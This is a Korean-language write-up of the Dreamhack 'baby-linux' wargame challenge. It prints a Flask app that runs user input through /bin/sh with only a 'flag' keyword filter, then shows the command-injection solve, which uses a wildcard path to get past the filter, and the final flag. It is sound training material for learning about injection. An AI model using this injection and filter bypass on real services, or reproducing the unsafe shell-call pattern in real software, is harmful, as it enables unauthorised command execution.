## baby-linux
> 문제 URL: https://dreamhack.io/wargame/challenges/837  
> 리눅스 명령어를 실행하는 웹 서비스가 작동하고 있습니다. 해당 웹 서비스의 코드가 첨부파일로 주어집니다. flag.txt 파일을 찾아 출력하여 플래그를 획득하세요!

### `echo $(구문)` 개요

`echo $(구문)`은 **명령 치환 (command substitution)**을 사용하여 `$(...)` 안의 명령을 실행하고 그 결과를 `echo` 명령으로 출력하는 방식입니다.

### 사용법:
```bash
echo $(명령)
```

### Solve
1. `echo $(구문)` 내에 `ls` 명령을 통해 내부 확인
```bash
total 32 drwxr-xr-x 5 chall chall 4096 Apr 21 2023 . 
dr-xr-xr-x 1 root root 4096 Feb 23 02:26 .. 
-rwxr-xr-x 1 root root 884 Apr 21 2023 app.py 
drwxr-xr-x 3 root root 4096 Apr 21 2023 dream 
-rw-r--r-- 1 root root 34 Apr 21 2023 hint.txt 
-rw-r--r-- 1 root root 5 Apr 21 2023 requirements.txt 
drwxr-xr-x 5 root root 4096 Apr 21 2023 static 
drwxr-xr-x 2 root root 4096 Apr 21 2023 templates
```
2. `cat hint.txt`를 통해 `flag.txt`의 위치 알아냄
```bash
Where is Flag? ./dream/hack/hello
```

3. `app.py` 코드를 보면 `flag` 문자열이 커맨드에 포함된 경우 `No!` 출력함
```python
import subprocess
from flask import Flask, request, render_template

APP = Flask(__name__)

@APP.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user_input = request.form.get('user_input')
        cmd = f'echo $({user_input})'
        if 'flag' in cmd:
            return render_template('index.html', result='No!')

        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('index.html', result=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('index.html', result='Timeout')
        except subprocess.CalledProcessError:
            return render_template('index.html', result='Error')

    return render_template('index.html')

if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)
```

4. `cat ./dream/hack/hello/*.txt`를 통해 flag 획득
```bash
DH{671ce26c70829e716fae26c7c71a33823feb479f2562891f64605bf68f60ae54}
```